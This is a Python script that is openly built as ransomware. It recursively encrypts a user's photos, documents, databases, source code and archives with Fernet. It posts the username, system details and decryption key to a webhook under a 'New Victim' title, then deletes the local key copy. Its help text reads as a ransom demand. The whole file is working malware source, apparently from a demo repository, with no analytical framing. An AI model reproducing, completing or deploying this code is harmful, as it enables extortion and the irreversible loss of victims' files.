import argparse
import getpass
import os
import pathlib
import smtplib
import platform
from cryptography.fernet import Fernet
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
import requests

parser = argparse.ArgumentParser(description=f'Your files have been encrypted. Contact us for further details and to get the decryption key.')
parser.add_argument('-k', '--key', type=str, metavar='', help='add cryptographic key to decrypt the document')
parser.add_argument('-b', '--backup', help='add cryptographic key to decrypt the document', action='store_true')
parser.add_argument('-d', '--directory', type=str, metavar='', help='add cryptographic key to decrypt the document', default='ransomware-main/test')
args = parser.parse_args()


def gotodir(directory_name):
    folder_location = pathlib.Path.home() / directory_name
    os.chdir(folder_location)
    return folder_location

def getfilesindir(current_directory):
    targeted_file_types = [
        # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
        'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw', # images
        'mp3','mp4', 'm4a', 'aac','ogg','flac', 'wav', 'wma', 'aiff', 'ape', # music and sound
        'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp', # Video and movies

        'doc', 'docx', 'xls', 'xlsx', 'ppt','pptx', # Microsoft office
        'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md', # OpenOffice, Adobe, Latex, Markdown, etc
        'yml', 'yaml', 'json', 'xml', 'csv', # structured data
        'db', 'sql', 'dbf', 'mdb', 'iso', # databases and disc images

        'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css', # web technologies
        'c', 'cpp', 'cxx', 'h', 'hpp', 'hxx', # C source code
        'java', 'class', 'jar', # java source code
        'ps', 'bat', 'vb', # windows based scripts
        'awk', 'sh', 'cgi', 'pl', 'ada', 'swift', # linux/mac based scripts
        'go', 'py', 'pyc', 'bf', 'coffee', # other source code files

        'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats

    ]
    file_list = []
    for root, subdirectories, files in os.walk(current_directory):
        for file in files:
            for file_type in targeted_file_types:
                if file_type in file:
                    file_list.append(os.path.join(root, file))    
        for subdirectory in subdirectories:    
            getfilesindir(subdirectory) 
    return file_list

def sendwebhook():
    webhook = 'webhook here or add a config file better yet'

    email_address = 'Womp Womp'
    crypto_key = f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key'
    msg_body = ( 
        f'''Username: {getpass.getuser()} \n\nSystem: {platform.uname().system} \nNone: {platform.uname().node} \nRelease: {platform.uname().release} \nVersion: {platform.uname().version} \nMachine: {platform.uname().machine} \nProcessor: {platform.uname().processor} \n\nCryptographic Key: { open(crypto_key).read() } \n'''
        )
        
    try:
        data = {
        "content" : "@everyone",
        "username" : "New Victim Alert"
        }
        
        data["embeds"] = [
        {
        "description" : f"{msg_body}",
        "title" : "New Victim"
        }
            ]
        result = requests.post(webhook, json = data)
    except Exception as error_msg:
        print ("Error:",error_msg)

def generate_key():
    key = Fernet.generate_key()
    with open('cryptographic_key.key', 'wb') as key_file:
        key_file.write(key)
    sendwebhook()
   
def encryptfiles(file_list):
    with open(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key', 'rb') as key_file:
        cryptographic_key = key_file.read()
    fernet = Fernet(cryptographic_key)
    if file_list:
        for document in file_list:
            with open(document, 'rb') as file:
                document_original = file.read()
            document_criptat = fernet.encrypt(document_original)
            with open(document, 'wb') as encrypted_document:
                encrypted_document.write(document_criptat)
        if args.backup == False:        
            os.remove(f'{pathlib.Path(__file__).parent.absolute()}/cryptographic_key.key')
        
    else:
        print('No document in directory')

def decrypt(file_list, cryptographic_key):
    fernet = Fernet(cryptographic_key)
    for document in file_list:
        with open(document, 'rb') as file:
            document_criptat = file.read()
        document_decriptat = fernet.decrypt(document_criptat)
        with open(document, 'wb') as encrypted_document:
            encrypted_document.write(document_decriptat)

if args.key:
    directory = gotodir(args.directory)
    documents = getfilesindir(directory)
    decrypt(documents, args.key)
else:
    generate_key()
    directory = gotodir(args.directory)
    documents = getfilesindir(directory)
    encryptfiles(documents)
